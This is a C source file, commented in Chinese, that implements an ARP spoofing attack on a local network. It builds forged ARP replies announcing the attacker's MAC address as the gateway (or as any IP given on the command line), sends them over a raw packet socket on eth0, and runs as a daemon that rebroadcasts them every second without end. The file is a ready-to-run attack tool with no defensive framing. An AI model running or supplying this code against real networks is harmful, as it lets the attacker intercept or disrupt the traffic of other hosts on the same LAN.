/*
欺骗同网段下其它主机
向其它主机发送" 我是网关"的虚假arp 信息
*/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/ioctl.h>			// SIOCGIFINDEX
#include <sys/types.h>
#include <netinet/if_ether.h>		// #include <linux/if_arp.h>
#include <netpacket/packet.h>		// struct sockaddr_ll
#include <net/ethernet.h>		// ETH_P_XXX
#include <net/if.h>			// struct ifreq
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#include "libwf.h"

unsigned char arp_data[60]={0};
unsigned char host_mac[6];
unsigned int cheat_ip, gw_ip;
int sockfd;

int get_info()
{
	char mac[64];
	char gw[16];
	
	if( getMAC_byCmd(mac) == 0 )
		return -1;
	printf("host mac: %s \n", mac);
	str2mac(mac, host_mac);

	if( getGW_byCmd(gw) == 0 )
		return -1;
	printf("gw: %s \n", gw);
	if( inet_aton(gw, (struct in_addr *)&gw_ip) == 0 )
		return -1;
	cheat_ip = gw_ip;

	return 0;
}

void put_data()
{
	int i=0, j=0;
	unsigned char *p;

	arp_data[i++] = 0xff;arp_data[i++] = 0xff;arp_data[i++] = 0xff;
	arp_data[i++] = 0xff;arp_data[i++] = 0xff;arp_data[i++] = 0xff;
	arp_data[i++] = host_mac[j++];arp_data[i++] = host_mac[j++];arp_data[i++] = host_mac[j++];
	arp_data[i++] = host_mac[j++];arp_data[i++] = host_mac[j++];arp_data[i++] = host_mac[j++];
	arp_data[i++] = 0x08;arp_data[i++] = 0x06;
	arp_data[i++] = 0x00;arp_data[i++] = 0x01;arp_data[i++] = 0x08;arp_data[i++] = 0x00;
	arp_data[i++] = 0x06;arp_data[i++] = 0x04;
	arp_data[i++] = 0x00;arp_data[i++] = 0x02;
	j=0;
	arp_data[i++] = host_mac[j++];arp_data[i++] = host_mac[j++];arp_data[i++] = host_mac[j++];
	arp_data[i++] = host_mac[j++];arp_data[i++] = host_mac[j++];arp_data[i++] = host_mac[j++];
	p = (unsigned char *)&cheat_ip;
	arp_data[i++] = *p++;arp_data[i++] = *p++;arp_data[i++] = *p++;arp_data[i++] = *p++;
	arp_data[i++] = 0xff;arp_data[i++] = 0xff;arp_data[i++] = 0xff;
	arp_data[i++] = 0xff;arp_data[i++] = 0xff;arp_data[i++] = 0xff;
	p = (unsigned char *)&gw_ip;
	arp_data[i++] = *p++;arp_data[i++] = *p++;arp_data[i++] = *p++;arp_data[i++] = *p++;

	//NetMsgLog("data", arp_data, 60, MSG_NO);
}

int init_sock()
{
	struct sockaddr_ll sll; // 注意结构体是sockaddr_ll
	struct ifreq ifstruct;
	char ifname[64];

	memset( &sll, 0, sizeof(sll) );
	sll.sll_family = AF_PACKET;

	if( getHostIP_2("eth0", NULL, NULL, ifname, &ifstruct.ifr_ifindex) == 0 )	strcpy(ifstruct.ifr_name, ifname);
	else		strcpy(ifstruct.ifr_name, "eth0");
	
	sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); // 创建Socket
	if(sockfd < 0)
		return -1;

	//ioctl(sockfd, SIOCGIFINDEX, &ifstruct); 
	sll.sll_ifindex = ifstruct.ifr_ifindex;
	sll.sll_protocol = htons(ETH_P_ALL);

	printf("%s %d \n", ifname, ifstruct.ifr_ifindex);

	if(bind(sockfd, (struct sockaddr *) &sll, sizeof(sll)) == -1 ) //在这里当然仍然需要绑定的
	{
		printf("bind error, %s \n", strerror(errno));
		return -1;
	}

	return 0;
}

int send_data()
{
	int ret;
	
	ret = send(sockfd, arp_data, 60, 0);
	//printf("ret of send: %d,  %s \n", ret, strerror(errno));

	return ret;
}

void arp_exit_system()
{
	close(sockfd);
	exit(0);
}

int main(int argc, char **argv)
{
	if( get_info() < 0 )
	{
		printf("get info failed \n");
		exit(0);
	}

	if(argc >= 2)
	{
		if( inet_aton(argv[1], (struct in_addr *)&cheat_ip) == 0 )
		{
			printf("ip addr error \n");
			exit(0);
		}
	}

	if( init_sock() < 0)
	{
		printf("socket failed \n");
		exit(0);
	}

	put_data();

	wf_demon(arp_exit_system);

	while(1)
	{
		sleep(1);
		send_data();
	}

	arp_exit_system();
	return 0;
}


